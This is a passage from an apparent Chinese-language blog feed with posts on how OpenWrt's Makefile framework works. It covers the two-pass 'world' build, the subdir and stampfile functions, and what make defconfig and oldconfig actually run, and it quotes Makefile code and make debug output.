$($(1)/builddirs-$(2)),$($(1)/builddirs-$(2)), linux))define subtarget  $(1)/$(2): $($(1)/) $(foreach bd,$(call subtarget-default,$(1),$(2)),$(1)/$(bd)/$(2))endef</code></pre><p>然后代入参数 <code>$(1): target</code>, <code>$(2): clean</code>, 得到：</p><pre><code class="makefile">subtarget-default = linuxdefine subtarget  target/clean: target/linux/cleanendef</code></pre><p>这与 log 中的一致，其它 <code>target</code> 的规则也是类似，这里最主要的就是一个默认编译规则，相当于在不指定具体 <code>target</code> 哪个子目录时，根据默认值进行编译，<code>target/Makefile</code> 定义的 <code>$(builddirs-default)</code> 就是 <code>linux</code>, 也就是说，执行 <code>make target/clean</code> 与 <code>make target/linux/clean</code> 是一样的。</p><p>除 <code>target</code> 目录外，<code>package</code>, <code>tools</code>, <code>toolchain</code> 目录也是类似的。</p><p>到这，最后的小尾巴也讲完啦。</p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>使用 makefile 的 <code>warning</code> 函数打印信息可以快速梳理 Makefile 的执行流程。</p><pre><code class="makefile">$(warning info)# Example# target/Makefile$(warning $(call subdir,$(curdir)))</code></pre><p>配合 <code>make -n V=s</code> 能够打印指令信息, 如果加上 <code>DEBUG</code> 可以显示更加详细的调试信息。</p><pre><code class="bash">make -d V=s DEBUG=dltvr# -n to print command onlymake -d -n V=s DEBUG=dltvr</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.atfeng.com/post/2016/openwrt%E7%BC%96%E8%AF%91%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90%E4%B9%8Bsubdir%E5%87%BD%E6%95%B0%E7%9A%84%E7%94%A8%E6%B3%95/">OpenWRT编译系统分析之subdir函数的用法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> makefile </tag>
            
            <tag> openwrt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openwrt Makefile 框架分析</title>
      <link href="2020/12/30/openwrt-mkfile/"/>
      <url>2020/12/30/openwrt-mkfile/</url>
      
        <content type="html"><![CDATA[<p>openwrt repo: <a href="https://github.com/openwrt/openwrt">https://github.com/openwrt/openwrt</a></p><h2 id="整体框架"><a href="#整体框架" class="headerlink" title="整体框架"></a>整体框架</h2><p><img src="/assets/openwrt/openwrt_arch.png" alt="openwrt arch"></p><ul><li>首行为buildroot默认目录<ul><li>config: 配置文件</li><li>include: openwrt 的 Makefile 文件</li><li>package: 各个软件包的Makefile, patches等文件</li><li>scripts: openwrt 包管理相关的 perl 脚本</li><li>target: 用于编译 kernel 和 firmware 的相关文件</li><li>toolchain: 包含用于获取 kernel headers, C lib, bin-utils, compiler, debugger 的指令</li><li>tools: 包含编译时所需的一些工具，如automake, autoconf, sed, cmake...</li></ul></li><li>第二行为编译后新增目录<ul><li>bin: 存放编译后的firmware和ipk文件</li><li>build_dir: 编译目录，软件包解压存放路径</li><li>dl: 软件包下载路径</li><li>feeds:</li><li>staging_dir: 存放编译后的交叉编译工具等</li><li>tmp: 存放临时文件, 如 Collecting package, target info</li></ul></li></ul><h2 id="常用变量"><a href="#常用变量" class="headerlink" title="常用变量"></a>常用变量</h2><p>在整个 Makefile 框架里，使用到了相当多的变量，其中常用的几个变量如下表所示：</p><table><thead><tr><th>Makefile</th><th>Variable</th><th>Value</th><th>Description</th></tr></thead><tbody><tr><td>all</td><td>CURDIR</td><td>shell pwd</td><td>当前编译目录</td></tr><tr><td>all</td><td>TOPDIR</td><td>$(CURDIR)</td><td>buildroot 根目录</td></tr><tr><td>all</td><td>TMP_DIR</td><td>$(TOPDIR)/tmp</td><td>tmp 目录</td></tr><tr><td>all</td><td>MAKE</td><td>make</td><td></td></tr><tr><td>all</td><td>_SINGLE</td><td>export MAKEFLAGS=$(space);</td><td></td></tr><tr><td>all</td><td>NO_TRACE_MAKE</td><td>make V=s$(OPENWRT_VERBOSE)</td><td></td></tr><tr><td>include/image.mk</td><td>MAKE</td><td>$(_SINGLE)$(SUBMAKE)</td><td></td></tr><tr><td>include/image.mk</td><td>NO_TRACE_MAKE</td><td>$(_SINGLE)$(NO_TRACE_MAKE)</td><td></td></tr><tr><td>include/verbose.mk</td><td>SUBMAKE</td><td>make or cmd() {...} or make -w</td><td></td></tr><tr><td>include/toplevel.mk</td><td>SUBMAKE</td><td>umask 022; $(SUBMAKE)</td><td></td></tr><tr><td>include/package.mk</td><td>SUBMAKE</td><td>$(NO_TRACE_MAKE)</td><td></td></tr></tbody></table><h2 id="主Makefile"><a href="#主Makefile" class="headerlink" title="主Makefile"></a>主Makefile</h2><p>主 Makefile 位于 buildroot 的根目录，是执行 make 时访问的首个 Makefile.</p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><pre><code class="makefile">TOPDIR:=$&#123;CURDIR&#125;LC_ALL:=CLANG:=CTZ:=UTCexport TOPDIR LC_ALL LANG TZempty:=space:= $(empty) $(empty)$(if $(findstring $(space),$(TOPDIR)),$(error ERROR: The path to the OpenWrt directory must not include any spaces))</code></pre><p><code>$&#123;CURDIR&#125;</code> 是 make 指令的内嵌变量，在执行 make 指令时，获取当前 Makefile 所在目录设为其值。相当于</p><pre><code class="bash">CURDIR=$(pwd)</code></pre><p><code>$&#123;TOPDIR&#125;</code> 就是 buildroot 根目录，export 之后在其它 Makefile 中也可以使用。</p><p><code>empty</code> 是个空值，用于设置默认值，<code>space</code>是个空格，通常也用于设置初始值、或者判断空格。</p><pre><code class="makefile">$(if $(findstring $(space),$(TOPDIR)),$(error ERROR: The path to the OpenWrt directory must not include any spaces))</code></pre><p>以上语句用于判断 buildroot 根目录是否包含空格，如果包含空格将会提示错误。</p><h3 id="world-目标"><a href="#world-目标" class="headerlink" title="world 目标"></a>world 目标</h3><p>主 Makefile 的首个目标是 <code>world</code>, 所以执行 <code>make V=s</code> 的目标就是 <code>world</code>.</p><p>但是在主 Makefile 中，一开始并没有给出依赖文件和执行指令。</p><pre><code class="makefile">world:</code></pre><p>注意看主 Makefile 的逻辑.</p><pre><code class="makefile">world:DISTRO_PKG_CONFIG:=$(shell which -a pkg-config | grep -E &#39;\/usr&#39; | head -n 1)export PATH:=$(TOPDIR)/staging_dir/host/bin:$(PATH)ifneq ($(OPENWRT_BUILD),1)  _SINGLE=export MAKEFLAGS=$(space);  override OPENWRT_BUILD=1  export OPENWRT_BUILD  GREP_OPTIONS=  export GREP_OPTIONS  CDPATH=  export CDPATH  include $(TOPDIR)/include/debug.mk  include $(TOPDIR)/include/depends.mk  include $(TOPDIR)/include/toplevel.mkelse  include rules.mk  include $(INCLUDE_DIR)/depends.mk  include $(INCLUDE_DIR)/subdir.mk  include target/Makefile  include package/Makefile  include tools/Makefile  include toolchain/Makefile$(toolchain/stamp-compile): $(tools/stamp-compile)$(target/stamp-compile): $(toolchain/stamp-compile) $(tools/stamp-compile) $(BUILD_DIR)/.prepared$(package/stamp-compile): $(target/stamp-compile) $(package/stamp-cleanup)$(package/stamp-install): $(package/stamp-compile)$(target/stamp-install): $(package/stamp-compile) $(package/stamp-install)check: $(tools/stamp-check) $(toolchain/stamp-check) $(package/stamp-check)#...endif</code></pre><p>简化下：</p><pre><code class="makefile">world:ifneq ($(OPENWRT_BUILD),1)  override OPENWRT_BUILD=1  export OPENWRT_BUILD# 第一条逻辑else# 第二条逻辑endif</code></pre><p>那么 world 是怎么编译完成的呢？下面详细探讨下。</p><h3 id="编译流程"><a href="#编译流程" class="headerlink" title="编译流程"></a>编译流程</h3><p>首次执行 make 时，进入第一条逻辑，并将第二条逻辑所需的变量 <code>OPENWRT_BUILD</code> 置为1, 所以在执行第二个make时，就会进入第二条逻辑。那么问题来了。</p><ol><li>通常我们只执行一条指令 <code>make V=s</code> , 那是如何进入第二条逻辑的？</li><li>第二条逻辑一定会执行到吗？</li><li>第二次执行 <code>make</code> 指令一定是进入第二条逻辑吗？</li></ol><p>ok, 针对这三个问题，首先我们要知道一点：</p><blockquote><p>执行 make 指令后，可以根据 Makefile 中某些目标指令执行新的 make 指令，也就是说，<strong>make 是可以嵌套的, Makefile是可以重入的</strong></p></blockquote><p>知道这个了，也就知道了 Makefile 文件是可以多次引用的，而且下一次引用可以携带之前的变量，如以上的 <code>OPENWRT_BUILD</code>。</p><p>下面来解释第一个问题，执行 <code>make V=s</code> 如何进入第二条逻辑？首先make后进入第一条逻辑，并引入以下Makefile.</p><pre><code class="makefile">  include $(TOPDIR)/include/debug.mk  include $(TOPDIR)/include/depends.mk  include $(TOPDIR)/include/toplevel.mk</code></pre><p>在引入的 <code>toplevel.mk</code> 中，有对目标 <code>world</code> 重新执行 <code>make</code> 操作，就是下面的 <code>%::</code> ，这个双冒号目标就会对 <code>world</code> 目标进行重写，对于双冒号目标，如果没有依赖项，其所属指令必定会执行。</p><pre><code class="makefile">%::  @+$(PREP_MK) $(NO_TRACE_MAKE) -r -s prereq  @( \    cp .config tmp/.config; \    ./scripts/config/conf $(KCONF_FLAGS) --defconfig=tmp/.config -w tmp/.config Config.in &gt; /dev/null 2&gt;&amp;1; \    if ./scripts/kconfig.pl &#39;&gt;&#39; .config tmp/.config | grep -q CONFIG; then \      printf &quot;$(_R)WARNING: your configuration is out of sync. Please run make menuconfig, oldconfig or defconfig!$(_N)\n&quot; &gt;&amp;2; \    fi \  )  @+$(ULIMIT_FIX) $(SUBMAKE) -r $@ $(if $(WARN_PARALLEL_ERROR), || &#123; \    printf &quot;$(_R)Build failed - please re-run with -j1 to see the real error message$(_N)\n&quot; &gt;&amp;2; \    false; \  &#125; )</code></pre><p>以上新的指令中 <code>$@</code> 对应的就是 <code>world</code>, 通过打印 log 可以验证这一点。其中的 <code>SUBMAKE</code> 需要结合 verbose.mk, toplevel.mk 推导出来。当然最简单的是使用 <code>make V=s -n</code> 打印log。</p><pre><code class="makefile"># verbose.mkSUBMAKE=$(MAKE) -w# toplevel.mkSUBMAKE:=umask 022; $(SUBMAKE)</code></pre><p>推导出 <code>$(SUBMAKE)</code> 就是 <code>umask 022; make -w</code>, 然后根据 <code>%::</code> 指令推出详细指令为：</p><pre><code class="bash">_limit=`ulimit -n`; [ &quot;$_limit&quot; = &quot;unlimited&quot; -o &quot;$_limit&quot; -ge 1024 ] || ulimit -n 1024; umask 022; make -w -r world</code></pre><p>执行这里的 <code>make</code> 指令时，由于之前已经将 <code>OPENWRT_BUILD</code> 设为1了，所以会进入上面提及的第二条逻辑。这也就解释了第一个问题，执行 <code>make V=s</code> 后，在 <code>toplevel.mk</code> 中针对目标 world 重新执行 make 指令，进入了第二条逻辑。</p><p>对于第二个问题，<strong>第二条逻辑一定会执行到吗？</strong> 答案是否定的，比如执行 <code>make oldconfig</code> 等指令时，在 toplevel.mk 就结束了，所以不会进入第二条逻辑。</p><p>对于第三个问题，<strong>第二次执行 <code>make</code> 指令一定是进入第二条逻辑吗？</strong> 答案也是否定的，某些指令同样会嵌套执行 make 指令，但是并不会进入第二条逻辑，这是怎么做到的呢？其实很简单，就是重新将 <code>OPENWRT_BUILD</code> 赋值为空就行。以上出现的变量 <code>PREP_MK</code> 就是这个作用。</p><pre><code class="makefile">PREP_MK= OPENWRT_BUILD= QUIET=0</code></pre><p>小结下，<code>make V=s</code> 会将 world 作为编译目标，首次访问主 Makefile 时，没有对目标设定规则，而是先设置 <code>OPENWRT_BUILD=1</code>, 然后执行某些初始化检查，最后重新执行新的 make 指令，并重入主 Makefile，根据新的 <code>OPENWRT_BUILD</code> 进入第二条逻辑。</p><h3 id="world-编译规则"><a href="#world-编译规则" class="headerlink" title="world 编译规则"></a>world 编译规则</h3><p>接下来看下第二条逻辑，这条逻辑中引入了新的 <code>.mk</code> 文件，并设置了 <code>world</code> 目标规则及其依赖项规则。</p><pre><code class="makefile">  include rules.mk  include $(INCLUDE_DIR)/depends.mk  include $(INCLUDE_DIR)/subdir.mk  include target/Makefile  include package/Makefile  include tools/Makefile  include toolchain/Makefile$(toolchain/stamp-compile): $(tools/stamp-compile)$(target/stamp-compile): $(toolchain/stamp-compile) $(tools/stamp-compile) $(BUILD_DIR)/.prepared$(package/stamp-compile): $(target/stamp-compile) $(package/stamp-cleanup)$(package/stamp-install): $(package/stamp-compile)$(target/stamp-install): $(package/stamp-compile) $(package/stamp-install)check: $(tools/stamp-check) $(toolchain/stamp-check) $(package/stamp-check)#...prepare: $(target/stamp-compile)#...prepare: .config $(tools/stamp-compile) $(toolchain/stamp-compile)  $(_SINGLE)$(SUBMAKE) -r buildinfo #...world: prepare $(target/stamp-compile) $(package/stamp-compile) $(package/stamp-install) $(target/stamp-install) FORCE  $(_SINGLE)$(SUBMAKE) -r package/index  $(_SINGLE)$(SUBMAKE) -r json_overview_image_info  $(_SINGLE)$(SUBMAKE) -r checksumifneq ($(CONFIG_CCACHE),)  $(STAGING_DIR_HOST)/bin/ccache -sendif</code></pre><p>从 <code>world</code> 的依赖中可以看到 target, package 相关的 compile, install 目标。每个依赖项都有其递归的目标编译规则和各自的依赖项，不同目标的依赖项可能会有重复。</p><h2 id="subdir"><a href="#subdir" class="headerlink" title="subdir"></a>subdir</h2><p>注意到以上主 Makefile 定义了很多 <code>$(NAME):</code> 的目标，说明这些目标的实际名称需要通过具体的变量获得，以 <code>$(target/stamp-compile)</code> 为例，在主 Makefile 中声明了对应的依赖信息，</p><pre><code class="makefile">$(target/stamp-compile): $(toolchain/stamp-compile) $(tools/stamp-compile) $(BUILD_DIR)/.prepared</code></pre><p>而且其依赖信息也包含大量变量引用，那么这些变量的具体值在哪呢? 答案是 <code>include/subdir.mk</code> ，这个文件在定义以上目标之前就引入了，前面已有提及。而 <code>subdir.mk</code> 并不是直接定义好了每个变量名，而是通过函数 <code>stampfile</code> 动态生成，这个函数会在对应子目录中被调用。</p><p>举例说明，<code>$(target/stamp-compile)</code> 通过 <code>target/Makefile</code> 中的以下指令生成。</p><pre><code class="makefile">$(eval $(call stampfile,$(curdir),target,compile,$(TMP_DIR)/.build))</code></pre><p><code>stampfile</code> 函数根据子目录名称 <code>target</code> 和目标 <code>compile</code> 生成 <code>target/stamp-compile</code> 的编译规则。</p><pre><code class="makefile"># Parameters: &lt;subdir&gt; &lt;name&gt; &lt;target&gt; &lt;depends&gt; &lt;config options&gt; &lt;stampfile location&gt;define stampfile  $(1)/stamp-$(3):=$(if $(6),$(6),$(STAGING_DIR))/stamp/.$(2)_$(3)$(5)  $$($(1)/stamp-$(3)): $(TMP_DIR)/.build $(4)      @+$(SCRIPT_DIR)/timestamp.pl -n $$($(1)/stamp-$(3)) $(1) $(4) || \          $(MAKE) $(if $(QUIET),--no-print-directory) $$($(1)/flags-$(3)) $(1)/$(3)      @mkdir -p $$$$(dirname $$($(1)/stamp-$(3)))      @touch $$($(1)/stamp-$(3))  $$(if $(call debug,$(1),v),,.SILENT: $$($(1)/stamp-$(3)))  .PRECIOUS: $$($(1)/stamp-$(3)) # work around a make bug  $(1)//clean:=$(1)/stamp-$(3)/clean  $(1)/stamp-$(3)/clean: FORCE      @rm -f $$($(1)/stamp-$(3))endef</code></pre><p>其中 <code>$(1)/stamp-$(3)</code> 对应的就是主 Makefile 声明的 <code>target/stamp-compile</code>, 而且紧随其后的就是对应该目标文件的依赖和指令。</p><p>ok, 到此就比较明了了，主 Makefile 中类似变量都是通过这种方式定义的。关于 subdir.mk 更详细的内容将在下一篇介绍。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol><li>openwrt 主 Makefile 导入了许多 include 目录和其它子目录的Makefile</li><li>Makefile 的指令中可以包含 make 指令以实现嵌套编译</li><li>同一个 Makefile 可以多次重入，但是环境变量可能会有所改变</li><li>make 指令不指定目标时，其默认目标为 <code>world</code></li><li><code>world</code> 目标依赖了大量子目录对应目标，且目标名称及其依赖、指令可以通过 subdir.mk 中的 stampfile 函数动态生成</li><li>编译 <code>world</code> 时，至少会调用两次主 Makefile<ol><li>首次通过 toplevel.mk 检查和编译必要的工具和文件，如scripts/config/conf, .config, tmp/* 等</li><li>第二次通过 OPENWRT_BUILD=1 编译 world 目标</li></ol></li><li>使用 make 指令的 <code>-n</code> 或 <code>-d</code> 参数可以更加清楚的打印编译信息，方便理解编译过程</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://c.biancheng.net/view/7129.html">Makefile目标类型大汇总</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> makefile </tag>
            
            <tag> openwrt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openwrt make defconfig 详解</title>
      <link href="2020/12/29/make-defconfig/"/>
      <url>2020/12/29/make-defconfig/</url>
      
        <content type="html"><![CDATA[<p>对于 linux kernel，有几个常用 make 指令用于生成 .config 文件。</p><ul><li>make oldconfig</li><li>make menuconfig</li><li>make defconfig</li><li>make config</li></ul><p>那么这些指令具体执行了什么操作呢，针对 openwrt 来看下吧。</p><h2 id="主-Makefile"><a href="#主-Makefile" class="headerlink" title="主 Makefile"></a>主 Makefile</h2><p>在 buildroot 执行 make，首先会访问仓库根目录的主 <a href="https://github.com/openwrt/openwrt/blob/master/Makefile">Makefile</a>，其中有个 ifneq 判断如下：</p><pre><code class="makefile">ifneq ($(OPENWRT_BUILD),1)  _SINGLE=export MAKEFLAGS=$(space);  override OPENWRT_BUILD=1  export OPENWRT_BUILD  GREP_OPTIONS=  export GREP_OPTIONS  CDPATH=  export CDPATH  include $(TOPDIR)/include/debug.mk  include $(TOPDIR)/include/depends.mk  include $(TOPDIR)/include/toplevel.mkelse  include rules.mk  include $(INCLUDE_DIR)/depends.mk  include $(INCLUDE_DIR)/subdir.mk  include target/Makefile  include package/Makefile  include tools/Makefile  include toolchain/Makefile</code></pre><p>make 时通常不会设置OPENWRT_BUILD，所以按照以上逻辑会 include 以下几个Makefile</p><ol><li>include/debug.mk</li><li>include/depends.mk</li><li>include/toplevel.mk</li></ol><p>前两个先不管，主要来看下toplevel.mk.</p><h2 id="toplevel-mk"><a href="#toplevel-mk" class="headerlink" title="toplevel.mk"></a>toplevel.mk</h2><p>在这个顶层 <a href="https://github.com/openwrt/openwrt/blob/master/include/toplevel.mk">Makefile</a> 中，定义了许多常用指令，其中就包含了 defconfig, oldconfig, menuconfig 等</p><pre><code class="makefile">config: scripts/config/conf prepare-tmpinfo FORCE    [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \        $&lt; $(KCONF_FLAGS) Config.inconfig-clean: FORCE    $(_SINGLE)$(NO_TRACE_MAKE) -C scripts/config cleandefconfig: scripts/config/conf prepare-tmpinfo FORCE    touch .config    @if [ ! -s .config -a -e $(HOME)/.openwrt/defconfig ]; then cp $(HOME)/.openwrt/defconfig .config; fi    [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \        $&lt; $(KCONF_FLAGS) --defconfig=.config Config.inconfdefault-y=allyesconfdefault-m=allmodconfdefault-n=allnoconfdefault:=$(confdefault-$(CONFDEFAULT))oldconfig: scripts/config/conf prepare-tmpinfo FORCE    [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \        $&lt; $(KCONF_FLAGS) --$(if $(confdefault),$(confdefault),old)config Config.inmenuconfig: scripts/config/mconf prepare-tmpinfo FORCE    if [ \! -e .config -a -e $(HOME)/.openwrt/defconfig ]; then \        cp $(HOME)/.openwrt/defconfig .config; \    fi    [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \        $&lt; Config.innconfig: scripts/config/nconf prepare-tmpinfo FORCE    if [ \! -e .config -a -e $(HOME)/.openwrt/defconfig ]; then \        cp $(HOME)/.openwrt/defconfig .config; \    fi    [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \        $&lt; Config.inxconfig: scripts/config/qconf prepare-tmpinfo FORCE    if [ \! -e .config -a -e $(HOME)/.openwrt/defconfig ]; then \        cp $(HOME)/.openwrt/defconfig .config; \    fi    $&lt; Config.in</code></pre><p>其中的oldconfig如下：</p><pre><code class="makefile">oldconfig: scripts/config/conf prepare-tmpinfo FORCE    [ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \        $&lt; $(KCONF_FLAGS) --$(if $(confdefault),$(confdefault),old)config Config.in</code></pre><p><code>KCONF_FLAGS</code> 默认为空，<code>confdefault</code> 也默认为空，所以以上指令实际上就是</p><pre><code class="bash">scripts/config/conf --oldconfig Config.in</code></pre><h2 id="make-oldconfig"><a href="#make-oldconfig" class="headerlink" title="make oldconfig"></a>make oldconfig</h2><p>接下来来验证下是否是这个指令。使用make的 <code>-n</code> 参数可以打印执行过程，但并不执行具体指令，非常方便于调试。</p><pre><code class="bash">$ make -n oldconfigmake -r -s staging_dir/host/.prereq-build OPENWRT_BUILD= QUIET=0mkdir -p tmp/infoexport MAKEFLAGS= ;make V=s -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;packageinfo&quot; SCAN_DIR=&quot;package&quot; SCAN_NAME=&quot;package&quot; SCAN_DEPTH=5 SCAN_EXTRA=&quot;&quot;export MAKEFLAGS= ;make V=s -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;targetinfo&quot; SCAN_DIR=&quot;target/linux&quot; SCAN_NAME=&quot;target&quot; SCAN_DEPTH=2 SCAN_EXTRA=&quot;&quot; SCAN_MAKEOPTS=&quot;TARGET_BUILD=1&quot;for type in package target; do \    f=tmp/.$&#123;type&#125;info; t=tmp/.config-$&#123;type&#125;.in; \    [ &quot;$t&quot; -nt &quot;$f&quot; ] || ./scripts/$&#123;type&#125;-metadata.pl  config &quot;$f&quot; &gt; &quot;$t&quot; || &#123; rm -f &quot;$t&quot;; echo &quot;Failed to build $t&quot;; false; break; &#125;; \done[ tmp/.config-feeds.in -nt tmp/.packageauxvars ] || ./scripts/feeds feed_config &gt; tmp/.config-feeds.in./scripts/package-metadata.pl mk tmp/.packageinfo &gt; tmp/.packagedeps || &#123; rm -f tmp/.packagedeps; false; &#125;./scripts/package-metadata.pl pkgaux tmp/.packageinfo &gt; tmp/.packageauxvars || &#123; rm -f tmp/.packageauxvars; false; &#125;./scripts/package-metadata.pl usergroup tmp/.packageinfo &gt; tmp/.packageusergroup || &#123; rm -f tmp/.packageusergroup; false; &#125;touch /home/litreily/openwrt/tmp/.build[ -L .config ] &amp;&amp; export KCONFIG_OVERWRITECONFIG=1; \    scripts/config/conf  --oldconfig Config.in</code></pre><p>可以看到最后一行对应的就是我们推算出来的结果。同样可知其它相关config的指令是：</p><ul><li><code>make defconfig</code>: scripts/config/conf --defconfig=.config Config.in</li><li><code>make oldconfig</code>: scripts/config/conf --oldconfig Config.in</li><li><code>make menuconfig</code>: scripts/config/mconf Config.in</li></ul><p>也就是说，make xxxconfig 最终执行的是 scripts/config 目录下的conf, mconf 指令，这两个指令也是需要编译的。在执行make xxxconfig时，conf, mconf 作为依赖文件同样会被编译。</p><h2 id="make-defconfig-详解"><a href="#make-defconfig-详解" class="headerlink" title="make defconfig 详解"></a>make defconfig 详解</h2><p>如果想要更加详细的 make 信息，可以使用 <code>-d</code> 参数，打印 debug 信息，根据 debug 信息可以看到编译过程中各种依赖嵌套的判断流程，对于学习 make 指令非常有用。</p><p>以 <code>make defconfig</code> 为例，执行 <code>make -d V=s defconfig</code></p><pre><code class="log">GNU Make 4.2.1Built for x86_64-pc-linux-gnuCopyright (C) 1988-2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Reading makefiles...Reading makefile &#39;Makefile&#39;...Reading makefile &#39;/home/litreily/openwrt/include/debug.mk&#39; (search path) (no ~ expansion)...Reading makefile &#39;/home/litreily/openwrt/include/depends.mk&#39; (search path) (no ~ expansion)...Reading makefile &#39;/home/litreily/openwrt/include/toplevel.mk&#39; (search path) (no ~ expansion)...Reading makefile &#39;/home/litreily/openwrt/include/verbose.mk&#39; (search path) (no ~ expansion)...Updating makefiles.... Considering target file &#39;/home/litreily/openwrt/include/verbose.mk&#39;.  Looking for an implicit rule for &#39;/home/litreily/openwrt/include/verbose.mk&#39;.  Trying pattern rule with stem &#39;verbose.mk&#39;.  Found an implicit rule for &#39;/home/litreily/openwrt/include/verbose.mk&#39;.  Finished prerequisites of target file &#39;/home/litreily/openwrt/include/verbose.mk&#39;. No need to remake target &#39;/home/litreily/openwrt/include/verbose.mk&#39;. Considering target file &#39;/home/litreily/openwrt/include/toplevel.mk&#39;.  Looking for an implicit rule for &#39;/home/litreily/openwrt/include/toplevel.mk&#39;.  Trying pattern rule with stem &#39;toplevel.mk&#39;.  Found an implicit rule for &#39;/home/litreily/openwrt/include/toplevel.mk&#39;.  Finished prerequisites of target file &#39;/home/litreily/openwrt/include/toplevel.mk&#39;. No need to remake target &#39;/home/litreily/openwrt/include/toplevel.mk&#39;. Considering target file &#39;/home/litreily/openwrt/include/depends.mk&#39;.  Looking for an implicit rule for &#39;/home/litreily/openwrt/include/depends.mk&#39;.  Trying pattern rule with stem &#39;depends.mk&#39;.  Found an implicit rule for &#39;/home/litreily/openwrt/include/depends.mk&#39;.  Finished prerequisites of target file &#39;/home/litreily/openwrt/include/depends.mk&#39;. No need to remake target &#39;/home/litreily/openwrt/include/depends.mk&#39;. Considering target file &#39;/home/litreily/openwrt/include/debug.mk&#39;.  Looking for an implicit rule for &#39;/home/litreily/openwrt/include/debug.mk&#39;.  Trying pattern rule with stem &#39;debug.mk&#39;.  Found an implicit rule for &#39;/home/litreily/openwrt/include/debug.mk&#39;.  Finished prerequisites of target file &#39;/home/litreily/openwrt/include/debug.mk&#39;. No need to remake target &#39;/home/litreily/openwrt/include/debug.mk&#39;. Considering target file &#39;Makefile&#39;.  Looking for an implicit rule for &#39;Makefile&#39;.  Trying pattern rule with stem &#39;Makefile&#39;.  Found an implicit rule for &#39;Makefile&#39;.  Finished prerequisites of target file &#39;Makefile&#39;. No need to remake target &#39;Makefile&#39;.Updating goal targets....Considering target file &#39;defconfig&#39;. File &#39;defconfig&#39; does not exist.  Considering target file &#39;scripts/config/conf&#39;.   File &#39;scripts/config/conf&#39; does not exist.   Looking for an implicit rule for &#39;scripts/config/conf&#39;.   Trying pattern rule with stem &#39;c&#39;.   Found an implicit rule for &#39;scripts/config/conf&#39;.    Considering target file &#39;staging_dir/host/.prereq-build&#39;.     File &#39;staging_dir/host/.prereq-build&#39; does not exist.      Considering target file &#39;include/prereq-build.mk&#39;.       Looking for an implicit rule for &#39;include/prereq-build.mk&#39;.       Trying pattern rule with stem &#39;prereq-build.mk&#39;.       Found an implicit rule for &#39;include/prereq-build.mk&#39;.       Finished prerequisites of target file &#39;include/prereq-build.mk&#39;.      No need to remake target &#39;include/prereq-build.mk&#39;.     Finished prerequisites of target file &#39;staging_dir/host/.prereq-build&#39;.    Must remake target &#39;staging_dir/host/.prereq-build&#39;.Putting child 0x7fffcb0a1800 (staging_dir/host/.prereq-build) PID 15999 on the chain.Live child 0x7fffcb0a1800 (staging_dir/host/.prereq-build) PID 15999 Reaping winning child 0x7fffcb0a1800 PID 15999 Live child 0x7fffcb0a1800 (staging_dir/host/.prereq-build) PID 16000 Checking &#39;working-make&#39;... ok.Checking &#39;case-sensitive-fs&#39;... ok.Checking &#39;proper-umask&#39;... ok.Checking &#39;gcc&#39;... ok.Checking &#39;working-gcc&#39;... ok.Checking &#39;g++&#39;... ok.Checking &#39;working-g++&#39;... ok.Checking &#39;ncurses&#39;... ok.Checking &#39;perl-data-dumper&#39;... ok.Checking &#39;perl-thread-queue&#39;... ok.Checking &#39;tar&#39;... ok.Checking &#39;find&#39;... ok.Checking &#39;bash&#39;... ok.Checking &#39;xargs&#39;... ok.Checking &#39;patch&#39;... ok.Checking &#39;diff&#39;... ok.Checking &#39;cp&#39;... ok.Checking &#39;seq&#39;... ok.Checking &#39;awk&#39;... ok.Checking &#39;grep&#39;... ok.Checking &#39;egrep&#39;... ok.Checking &#39;getopt&#39;... ok.Checking &#39;stat&#39;... ok.Checking &#39;unzip&#39;... ok.Checking &#39;bzip2&#39;... ok.Checking &#39;wget&#39;... ok.Checking &#39;perl&#39;... ok.Checking &#39;python2-cleanup&#39;... ok.Checking &#39;python&#39;... ok.Checking &#39;python3&#39;... ok.Checking &#39;git&#39;... ok.Checking &#39;file&#39;... ok.Checking &#39;rsync&#39;... ok.Checking &#39;ldconfig-stub&#39;... ok.Reaping winning child 0x7fffcb0a1800 PID 16000 Live child 0x7fffcb0a1800 (staging_dir/host/.prereq-build) PID 16418 Reaping winning child 0x7fffcb0a1800 PID 16418 Removing child 0x7fffcb0a1800 PID 16418 from chain.    Successfully remade target file &#39;staging_dir/host/.prereq-build&#39;.   Finished prerequisites of target file &#39;scripts/config/conf&#39;.  Must remake target &#39;scripts/config/conf&#39;.Putting child 0x7fffcb0a1b70 (scripts/config/conf) PID 16422 on the chain.Live child 0x7fffcb0a1b70 (scripts/config/conf) PID 16422 make[1]: Entering directory &#39;/home/litreily/openwrt/scripts/config&#39;cc -O2   -c -o conf.o conf.ccc -O2   -c -o confdata.o confdata.ccc -O2   -c -o expr.o expr.ccc -O2 -I ./.   -c -o lexer.lex.o lexer.lex.ccc -O2 -I ./.   -c -o parser.tab.o parser.tab.ccc -O2   -c -o preprocess.o preprocess.ccc -O2   -c -o symbol.o symbol.ccc -O2   -c -o util.o util.ccc   conf.o confdata.o expr.o lexer.lex.o parser.tab.o preprocess.o symbol.o util.o   -o confmake[1]: Leaving directory &#39;/home/litreily/openwrt/scripts/config&#39;Reaping winning child 